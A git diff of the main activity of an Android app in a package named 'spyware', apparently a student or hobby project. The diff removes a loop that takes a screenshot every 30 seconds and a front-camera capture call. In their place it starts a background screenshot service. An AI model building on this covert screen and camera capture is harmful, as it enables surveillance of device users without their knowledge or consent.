@@ -1,6 +1,7 @@
 package com.example.cristianturetta.spyware;
 
 import android.app.Activity;
+import android.content.Intent;
 import android.os.AsyncTask;
 import android.os.Handler;
 import android.os.Looper;
@@ -9,8 +10,9 @@ import android.os.Bundle;
 import android.util.Log;
 
 import java.io.DataOutputStream;
+import java.io.Serializable;
 
-public class MainActivity extends AppCompatActivity {
+public class MainActivity extends AppCompatActivity implements Serializable {
 
     private class StartupAsyncTask extends AsyncTask<Void, Void, Void> {
         @Override
@@ -21,38 +23,22 @@ public class MainActivity extends AppCompatActivity {
             return null;
         }
     }
-    private static class ScreenshotRunnable implements Runnable {
-        private Handler handler = new Handler();
-        private Activity activity;
-
-        public ScreenshotRunnable(Activity activity) {
-            this.activity = activity;
-        }
-
-        @Override
-        public void run() {
-            ScreenShooter shooter = new ScreenShooter(activity);
-            shooter.shoot();
-            handler.postDelayed(this, 30000);
-        }
-    }
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
 
-
-        ScreenShooter shooter = new ScreenShooter(this);
-        FrontCameraShooter frontCameraShooter = new FrontCameraShooter();
-
         setContentView(R.layout.activity_main);
 
-        shooter.shoot();
-        frontCameraShooter.frontCameraShoot();
+        Intent screenShooterIntent = new Intent(this, ScreenShooter.class);
+        Bundle bundle = new Bundle();
+        bundle.putSerializable("activity", this);
+        screenShooterIntent.putExtras(bundle);
+        //screenShooterIntent.putExtra("activity", MainActivity.class);
+        startService(screenShooterIntent);
 
-        (new StartupAsyncTask()).doInBackground();
-        (new ScreenshotRunnable(this)).run();
-        finish();
+        //(new StartupAsyncTask()).doInBackground();
+        //finish();
 
     }
 
